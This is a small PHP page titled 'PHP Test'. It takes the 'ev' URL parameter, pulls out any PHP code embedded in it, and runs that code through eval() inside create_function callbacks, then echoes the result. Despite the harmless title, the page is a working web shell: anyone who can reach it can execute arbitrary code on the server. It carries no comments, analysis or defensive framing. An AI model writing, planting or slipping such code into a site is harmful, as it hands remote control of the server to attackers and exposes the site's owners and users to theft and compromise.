<html>
 <head>
  <title>PHP Test</title>
 </head>
 <body>
 <?php
 $Ev = $_GET['ev'];
 $string = ($Ev);
 $string = preg_replace_callback("/(<\?=)(.*?)\?>/si",create_function('$string','ob_start();eval("$string[2];");$return = ob_get_contents();ob_end_clean();return $return;'),$string);
 $string= preg_replace_callback("/(<\?php|<\?)(.*?)\?>/si",create_function('$string','ob_start();eval("print $string[2];");$return = ob_get_contents();ob_end_clean();return $return;'),$string);
 echo $string;
 ?>
 </body>
</html>
